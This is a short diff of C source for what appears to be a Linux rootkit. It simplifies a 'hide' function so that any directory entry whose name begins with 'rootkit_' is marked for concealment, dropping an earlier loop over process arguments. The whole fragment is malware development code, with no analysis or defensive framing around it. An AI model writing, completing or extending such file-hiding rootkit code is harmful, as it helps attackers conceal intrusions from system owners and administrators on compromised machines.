@@ -41,16 +41,10 @@ struct linux_dirent {
 int hide(char *d_name)
 {
 	int i = 0;
-	if(pid)
+	if(strstr(d_name, "rootkit_") == d_name) 
 	{
-		for(i=0;i<argcount;i++)
-		{
-			if(strstr(d_name, "rootkit_") == d_name) 
-			{
-				return 1;
-			}
-		}
-	}	
+		return 1;
+	}
 
 	return 0;
 }
